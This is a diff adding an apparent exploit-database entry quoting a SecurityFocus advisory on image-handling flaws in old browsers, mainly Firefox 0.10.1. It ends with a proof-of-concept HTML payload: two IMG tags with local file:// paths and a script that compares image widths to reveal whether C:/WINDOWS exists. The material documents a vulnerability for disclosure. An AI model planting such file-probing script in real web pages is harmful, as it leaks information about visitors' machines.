@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/11645/info
+
+Various browsers are reported prone to multiple vulnerabilities in the image handling functionality through the <IMG> tag. These issues can allow remote attackers to determine the existence of local files, cause a denial of service condition, and disclose passwords for Windows systems via file shares.
+
+Mozilla Firefox 0.10.1 and prior versions are reported vulnerable to these issues. It is alleged that Microsoft Internet Explorer and Netscape Browsers are also vulnerable to these issues. Due to this vulnerable packages for Internet Explorer and Netscape have been added. This BID will be updated as more information becomes available.
+
+<img src="file:///c|/nonexistent/content.gif">
+<img src="file:///c|/windows/content.gif">
+
+<script>
+onload =function(){
+incl=(document.images[0].width!=document.images[1].width)? "" :"not ";
+alert("Windows is "+ incl +"installed in C:/WINDOWS/");
+}
+</script>
